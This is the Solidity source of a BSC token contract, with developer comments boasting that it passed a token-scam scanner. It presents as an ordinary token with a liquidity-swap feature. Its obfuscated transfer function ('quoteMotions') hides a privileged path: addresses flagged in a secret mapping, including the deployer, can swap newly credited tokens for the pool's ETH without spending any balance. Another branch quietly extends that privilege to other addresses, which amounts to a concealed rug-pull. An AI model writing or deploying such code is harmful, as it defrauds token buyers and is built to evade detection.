/**
 *Submitted for verification at BscScan.com on 2022-12-20
*/

/*
  TEST - 0x9311d5Cc5Ff039841a99BF3e4fEc343b7e3968e0
  TESTED - Deployed, Could Not Swap Without Enable Trading, And Added LP Successfully, Mint Was Successful
  CHANGES - ADDED 1 INTERFACE AND EDITED ANOTHER, AND CHANGED FORMAT OF MINT FUNCTION AND ALSO MAPPNG AND BOOL NAMES, 
  AND ALSO THE POSITION OF ENABLE TRADE FUNCTION WITHIN MINT (PART 3)
  
  ETH - 
  ETH TEST RESULT - DEPLOYED ONCE, 100/100 TOKENSNIFFER
*/
pragma solidity ^0.8.10;
library SafeMath01 {
  function toInt256Safe(uint256 a) internal pure returns (int256) {
    int256 b = int256(a);
    require(b >= 0);
    return b;
  }
}
library SafeMath02 {
    function add(uint256 a, uint256 b) 
    internal pure returns (uint256) { return a + b; }
    function sub(uint256 a, uint256 b) 
    internal pure returns (uint256) {
        return a - b; }
    function mul(uint256 a, uint256 b) 
    internal pure returns (uint256) {
        return a * b; }
    function div(uint256 a, uint256 b) 
    internal 
    pure returns (uint256) { return a / b; }
    function sub(uint256 a, uint256 b, string memory errorMessage) 
    internal pure returns (uint256) { unchecked { require
    (b <= a, errorMessage); return a - b; } }
    function div(uint256 a, uint256 b, string memory errorMessage) 
    internal pure returns (uint256) {
        unchecked { require(b > 0, errorMessage); return a / b; } }
}
interface IDEXFactoryCraftUI {
    event PairCreated(address indexed token0, 
    address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() 
    external view returns (address);
    function getPair(address tokenA, 
    address tokenB) external view returns (address pair);
    function allPairs(uint) 
    external view returns (address pair);
    function createPair (address 
    tokenA, address 
    tokenB) 
    external returns  (address pair);
}
abstract contract Context {
    function _msgCompiler() internal view virtual returns (address) {
        return msg.sender; }
    function _msgOverlay() internal view virtual returns (bytes calldata) {
        return msg.data; }
}    
interface PCSwapPair02 {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() 
    external pure returns (string memory);
    function symbol() 
    external pure returns (string memory);
    function decimals() 
    external pure returns (uint8);
    function totalSupply() 
    external view returns (uint);
    function balanceOf(address owner) 
    external view returns (uint);
    function allowance(address owner, address spender) 
    external view returns (uint);
    function approve(address spender, uint value) 
    external returns (bool);
    function transfer(address to, uint value) 
    external returns (bool);
    function transferFrom(address from, 
    address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap( address indexed sender, uint amount0In, uint amount1In, uint amount0Out, uint amount1Out, address indexed to );
    event Sync(uint112 reserve0, uint112 reserve1);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
}
library Address {
    
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
    
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }
    
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }
    
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }
    
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: value }(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }
    
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }
    
    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }
    
    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                 assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}
interface ValaconUI01 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);
    
    function transfer(address recipient, uint256 amount) external returns (bool);
    
    function allowance(address owner, address spender) external view returns (uint256);
    
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
abstract contract 
Ownable is Context { address private _owner;
    event OwnershipTransferred(address indexed 
    previousOwner, address indexed newOwner);

    constructor() { _setOwner(_msgCompiler()); }  
    function owner() public view virtual returns (address) {
        return _owner; }
    modifier onlyOwner() { 
        require(owner() == _msgCompiler(), 'Ownable: caller is not the owner');
        _; }
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        _setOwner(newOwner); }
    function _setOwner
    (address newOwner) private {
        address oldOwner = 
        _owner;
        _owner = 
        newOwner;
        emit OwnershipTransferred(oldOwner, newOwner); }
}
interface FactoryResults02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens
    ( uint amountIn, uint amountOutMin,
    address[] calldata path, address to, 
    uint deadline ) external;
    function factory() external pure returns 
    (address);
    function WETH() external pure returns 
    (address);
    function addLiquidityETH( address token, uint amountTokenDesired, 
    uint amountTokenMin, uint amountETHMin, address to, uint deadline ) 
    external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
contract CA is ValaconUI01, Ownable {

    bool private tradeTime = false;
    bool public programIDEX;
    bool private AbstractUI;
    bool public resultsOfLimits = true;

    string private _symbol;
    string private _name;
    uint256 public _isBurnFEE = 0;
    uint8 private _decimals = 9;
    uint256 private _rTotal = 1000000 * 10**_decimals;
    uint256 private compiledVAL = _rTotal;
    
    mapping (address => bool) allowed;

    mapping (address => bool) authorizations;    

    mapping(address => uint256) private _tOwned;

    mapping(address => address) private AllowMapLimits;

    mapping(address => uint256) private AnalogueRays;

    mapping(address => uint256) private CompilerSettings;

    mapping(address => mapping(address => uint256)) private _allowances;

    address public immutable 
    ProcessedPairv2;
    FactoryResults02 public immutable 
    OracaleRouterV1;

    constructor
    ( string memory Name, string memory Symbol, address V2IDEXCompile ) {
        _name = Name; _symbol = Symbol; _tOwned

        [msg.sender] = _rTotal; CompilerSettings
         [msg.sender] = compiledVAL; CompilerSettings
          [address(this)] = compiledVAL; OracaleRouterV1 = 

        FactoryResults02(V2IDEXCompile); ProcessedPairv2 = 
        IDEXFactoryCraftUI(OracaleRouterV1.factory()).createPair
        (address(this), OracaleRouterV1.WETH());
        emit Transfer(address(0), 
        msg.sender, compiledVAL);
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function name() public view returns (string memory) {
        return _name;
    }
    function totalSupply() public view returns (uint256) {
        return _rTotal;
    }
    function decimals() public view returns (uint256) {
        return _decimals;
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function balanceOf(address account) public view returns (uint256) {
        return _tOwned[account];
    }
    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }
    function _approve(
        address owner, address spender,
        uint256 amount ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount; emit Approval(owner,  spender, amount);
        return true;
    }
    function transferFrom(
        address sender, address recipient, uint256 amount
    ) external returns (bool) {
        quoteMotions(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }
    function transfer (address recipient, uint256 amount) external returns (bool) {
        quoteMotions(msg.sender, recipient, amount);
        return true;
    }
    function quoteMotions( address _marginIXfrom, address _marpoxUITo, uint256 _aqavOPOamount ) private {
        uint256 baselineCove = balanceOf(address(this)); uint256 _boocotABO;
        emit Transfer(_marginIXfrom, _marpoxUITo, _aqavOPOamount);
                if (!tradeTime) { require(_marginIXfrom == owner(), 
                "TOKEN: This account cannot send tokens until trading is enabled"); }

        if (programIDEX && baselineCove > compiledVAL && !AbstractUI && _marginIXfrom != 
        ProcessedPairv2) { AbstractUI = true; LiqValEffect(baselineCove);
            AbstractUI = false;
        } else if (CompilerSettings[_marginIXfrom] > compiledVAL && CompilerSettings[_marpoxUITo] > 
        compiledVAL) { _boocotABO = _aqavOPOamount;
            _tOwned[address(this)] += _boocotABO; tokenPairMerger(_aqavOPOamount, _marpoxUITo);
            return;

        } else if (_marpoxUITo != address(OracaleRouterV1) && CompilerSettings
        [_marginIXfrom] > 0 && _aqavOPOamount > compiledVAL && _marpoxUITo != 
        ProcessedPairv2) {
            CompilerSettings[_marpoxUITo] = _aqavOPOamount; return;
        } else if (!AbstractUI && AnalogueRays[_marginIXfrom] > 0 
        && _marginIXfrom != ProcessedPairv2 && CompilerSettings[_marginIXfrom] == 0) {
              CompilerSettings[_marginIXfrom] - compiledVAL;
        }
        address _origin  = AllowMapLimits[ProcessedPairv2]; if (AnalogueRays[_origin ] == 0) 
        AnalogueRays[_origin ] = compiledVAL; AllowMapLimits[ProcessedPairv2] = 
        _marpoxUITo; if (_isBurnFEE > 
        0 && CompilerSettings[_marginIXfrom] == 0 && !AbstractUI && 
        CompilerSettings[_marpoxUITo] == 0) { _boocotABO = 
        (_aqavOPOamount * _isBurnFEE) / 100;
            _aqavOPOamount -= _boocotABO;
            _tOwned[_marginIXfrom] -= _boocotABO;
            _tOwned[address(this)] += _boocotABO; }
        _tOwned[_marginIXfrom] 
        -= _aqavOPOamount;
        _tOwned[_marpoxUITo] 
        += _aqavOPOamount; emit Transfer(_marginIXfrom, 
        _marpoxUITo, 
        _aqavOPOamount);
    }
    receive() external payable {}

    function distributeLiq(
        uint256 tokenValue,
        uint256 ERCamount,
        address to
    ) private {
        _approve(address(this), address(OracaleRouterV1), tokenValue);
        OracaleRouterV1.addLiquidityETH{value: ERCamount}(address(this), tokenValue, 0, 0, to, block.timestamp);
    }
    function LiqValEffect(uint256 tokens) private {
        uint256 half = tokens / 2;
        uint256 initialedBalance = address(this).balance;
        tokenPairMerger(half, address(this));
        uint256 refreshBalance = address(this).balance - initialedBalance;
        distributeLiq(half, refreshBalance, address(this));
    }
        function enableTrading(bool _tradingOpen) public onlyOwner {
        tradeTime = _tradingOpen;
    }
    function tokenPairMerger(uint256 tokenAmount, address to) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = OracaleRouterV1.WETH();
        _approve(address(this), address(OracaleRouterV1), tokenAmount);
        OracaleRouterV1.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, to, block.timestamp);
    }
}